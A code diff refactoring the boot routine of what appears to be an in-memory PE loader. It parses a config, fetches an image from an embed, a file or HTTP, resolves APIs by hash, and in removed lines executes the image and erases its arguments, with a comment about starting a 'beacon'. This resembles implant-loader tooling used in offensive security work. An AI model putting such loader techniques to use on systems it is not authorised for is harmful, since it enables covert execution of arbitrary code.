@@ -5,10 +5,10 @@
 #include "pe_image.h"
 #include "errno.h"
 #include "runtime.h"
-#include "pe_loader.h"
 #include "boot.h"
 
-static void* loadImage(Runtime_M* runtime);
+static errno loadConfig(Runtime_M* runtime, Config* config);
+static void* loadImage(Runtime_M* runtime, byte* config);
 static void* loadImageFromEmbed(Runtime_M* runtime, byte* config);
 static void* loadImageFromFile(Runtime_M* runtime, byte* config);
 static void* loadImageFromHTTP(Runtime_M* runtime, byte* config);
@@ -25,61 +25,38 @@ errno Boot(void* ctx)
     // reserved extended arguments
     (void)ctx;
 
+    // store boot configuration
+    Config config;
+    mem_init(&config, sizeof(config));
     // initialize PE Loader
-    PELoader_M* loader = NULL;
     errno err = NO_ERROR;
     for (;;)
     {
-        // load PE Image, it cannot be empty
-        void* image = loadImage(runtime);
+        // load config from argument stub
+        err = loadConfig(runtime, &config);
+        if (err != NO_ERROR)
+        {
+            break;
+        }
+        // prepare pe image data to config
+        void* image = loadImage(runtime, config.Image);
         if (image == NULL)
         {
             err = GetLastErrno();
             break;
         }
-        PELoader_Cfg config = {
-            .FindAPI = runtime->HashAPI.FindAPI_MA,
-
-            .Image          = image,
-            .CommandLineA   = NULL,
-            .CommandLineW   = NULL,
-            .StdInput       = NULL,
-            .StdOutput      = NULL,
-            .StdError       = NULL,
-            .WaitMain       = false,
-            .AllowSkipDLL   = false,
-            .IgnoreStdIO    = true,
-            .NotAutoRun     = false,
-            .NotStopRuntime = false,
-        };
-        loader = InitPELoader(runtime, &config);
-        if (loader == NULL)
-        {
-            err = GetLastErrno();
-            break;
-        }
-        runtime->Memory.Free(image);
-        runtime->Argument.EraseAll();
-        // initialize dll before start beacon
-        err = loader->Execute();
+        // prepare .NET runtime
         break;
     }
-    if (err != NO_ERROR || loader == NULL)
+    if (err != NO_ERROR)
     {
         runtime->Core.Exit();
         return err;
     }
 
-    // boot .NET runtime
 
 
-
-    // destroy pe loader and exit runtime
-    errno eld = loader->Destroy();
-    if (eld != NO_ERROR && err == NO_ERROR)
-    {
-        err = eld;
-    }
+    // exit runtime
     errno ere = runtime->Core.Exit();
     if (ere != NO_ERROR && err == NO_ERROR)
     {
@@ -88,25 +65,30 @@ errno Boot(void* ctx)
     return err;
 }
 
-static void* loadImage(Runtime_M* runtime)
+static errno loadConfig(Runtime_M* runtime, Config* config)
 {
-    byte*  config = NULL;
     uint32 size;
-    if (!runtime->Argument.GetPointer(ARG_ID_PE_IMAGE, &config, &size))
+    if (!runtime->Argument.GetPointer(ARG_ID_PE_IMAGE, &config->Image, &size))
     {
-        SetLastErrno(ERR_NOT_FOUND_PE_IMAGE);
-        return NULL;
+        return ERR_NOT_FOUND_PE_IMAGE;
     }
     if (size == 0)
     {
-        SetLastErrno(ERR_EMPTY_PE_IMAGE_DATA);
-        return NULL;
+        return ERR_EMPTY_PE_IMAGE_DATA;
     }
-    if (size < 1)
+    if (!runtime->Argument.GetValue(ARG_ID_WAIT_MAIN, &config->WaitMain, &size))
     {
-        SetLastErrno(ERR_INVALID_IMAGE_CONFIG);
-        return NULL;
+        return ERR_NOT_FOUND_WAIT_MAIN;
     }
+    if (size != sizeof(BOOL))
+    {
+        return ERR_INVALID_WAIT_MAIN;
+    }
+    return NO_ERROR;
+}
+
+static void* loadImage(Runtime_M* runtime, byte* config)
+{
     byte mode = *config;
     config++;
     switch (mode)
